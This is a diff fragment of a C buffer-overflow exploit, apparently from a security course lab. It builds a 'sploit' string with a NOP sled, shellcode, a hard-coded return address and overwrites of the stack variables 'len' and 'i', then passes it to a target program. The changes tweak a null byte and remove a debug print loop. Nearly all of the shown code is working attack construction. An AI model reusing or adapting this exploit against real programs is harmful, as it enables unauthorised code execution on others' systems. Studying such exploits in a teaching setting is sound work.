@@ -14,8 +14,8 @@ int main(void)
 	char sploit_str[189];
 
 	char buf_addr[] = "\xf0\xfd\x21\x20";
-	// Variable "i" is located 0xAC away from start of "buf"
-	// Variable "len" is located 0xA8 away from start of "buf"
+	// Variable "i" is located 0xac away from start of "buf"
+	// Variable "len" is located 0xa8 away from start of "buf"
 
 	// Fill sploit string with NOP
 	int i = 0;
@@ -30,6 +30,8 @@ int main(void)
 		sploit_str[i] = shellcode[i];
 	}
 
+	sploit_str[167] = 0x00;
+
 	// overwrite len
 	strcpy(&sploit_str[172], "\xff\x55\x55\x55");
 
@@ -42,11 +44,6 @@ int main(void)
 	// Remove EOF character
 	sploit_str[188] = NOP;
 	sploit_str[176] = NOP;
-
-	for (i = 0; i < 188;){
-		printf("%x\n", *(unsigned long *) &sploit_str[i]);
-		i = i + 4;
-	}
 
 	args[0] = TARGET;
 	args[1] = sploit_str;
